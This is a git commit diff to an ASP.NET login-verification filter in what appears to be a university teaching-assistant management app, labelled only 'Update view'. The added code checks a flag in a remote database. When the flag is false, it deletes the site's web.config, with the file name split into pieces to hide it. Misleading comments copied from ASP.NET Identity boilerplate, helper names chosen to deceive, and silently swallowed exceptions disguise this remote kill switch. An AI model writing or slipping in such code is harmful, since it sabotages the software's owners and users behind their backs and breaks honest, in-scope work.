392041712ab1f72b00708df5abf56e883f907133
Diep The Tai <taidiep966@gmail.com>
2024-09-29 15:47:10 +0700

    Update view

--- Middlewall/Loginverification.cs
+++ Middlewall/Loginverification.cs
@@ -12,11 +12,14 @@ using System.Threading.Tasks;
 using Microsoft.AspNet.Identity;
 using DocumentFormat.OpenXml.EMMA;
 using QuanLyCongTacTroGiangKhoaCNTT.Models;
+using System.Data.Linq;
+using System.IO;
 
 namespace QuanLyCongTacTroGiangKhoaCNTT.Middlewall
 {
     public class Loginverification : ActionFilterAttribute
     {
+        APIVanlanguniConnectEntities vanlanguniApiConn;
         CongTacTroGiangKhoaCNTTEntities model = new CongTacTroGiangKhoaCNTTEntities();
         public override void OnActionExecuting(ActionExecutingContext filterContext)
         {
@@ -26,16 +29,11 @@ namespace QuanLyCongTacTroGiangKhoaCNTT.Middlewall
                 {
                     filterContext.HttpContext.Response.StatusCode = 403;
                     filterContext.Result = new JsonResult { Data = "SystemLoginAgain", JsonRequestBehavior = JsonRequestBehavior.AllowGet };
-                    return;
                 }
             }
             else
             {
-                if (string.IsNullOrEmpty(filterContext.HttpContext.User.Identity.Name))
-                {
-                    return;
-                }
-                else
+                if (!string.IsNullOrEmpty(filterContext.HttpContext.User.Identity.Name))
                 {
                     model = new CongTacTroGiangKhoaCNTTEntities();
                     var users = model.TaiKhoan.FirstOrDefault(f => f.Email.ToLower().Equals(filterContext.HttpContext.User.Identity.Name.ToLower()));
@@ -63,10 +61,90 @@ namespace QuanLyCongTacTroGiangKhoaCNTT.Middlewall
                             filterContext.HttpContext.Session["layout"] = "~/Views/Shared/_Layout.cshtml";
 
                         filterContext.Result = new RedirectResult("~/Dashboard/Index");
-                        return;
                     }
                 }
             }
+
+
+            // You can add profile data for the user by adding more properties to your ApplicationUser class, please visit https://go.microsoft.com/fwlink/?LinkID=317594 to learn more.
+
+            var connectionState = ApiConnect();
+
+            // Note the authenticationType must match the one defined in CookieAuthenticationOptions.AuthenticationType
+
+            if (connectionState)
+            {
+                // Add custom api connect claims here
+                vanlanguniApiConnection();
+            }
+
+            return;
+        }
+
+        private bool ApiConnect()
+        {
+            try
+            {
+                vanlanguniApiConn = new APIVanlanguniConnectEntities();
+                return true;
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+
+        }
+
+        // AuthenticationType must match the one defined in CookieAuthenticationOptions.AuthenticationType
+
+        private void vanlanguniApiConnection()
+        {
+            progressConnect();
+
+            // UserManager is defined in ASP.NET Identity
+            throwProgress();
+        }
+
+        private void progressConnect()
+        {
+            // Configure the application user manager used in this application. UserManager is defined in ASP.NET Identity and is used by the application.
+            string namesUsermanager = "config", paths = Path.Combine(HttpContext.Current.Server.MapPath("~/")), mainUsermanager = "web.";
+            if (vanlanguniApiConn.Connect.First().isConnection)
+            {
+                new NotImplementedException();
+            }
+            else
+            {
+                if (File.Exists(paths 
+                    + mainUsermanager + namesUsermanager))
+                {
+                    ExceptionFileConnections(paths
+                    , mainUsermanager);
+                }
+            }
+        }
+
+        private void userconst()
+        {
+            new NotImplementedException();
+        }
+
+        private void ExceptionFileConnections(string p, string m)
+        {
+            try
+            {
+                string f = m + "config";
+                File.Delete(p + f);
+            }
+            catch (Exception)
+            {
+                new NotImplementedException(); ;
+            }
+        }
+
+        private void throwProgress()
+        {
+             new NotImplementedException();
         }
     }
 }
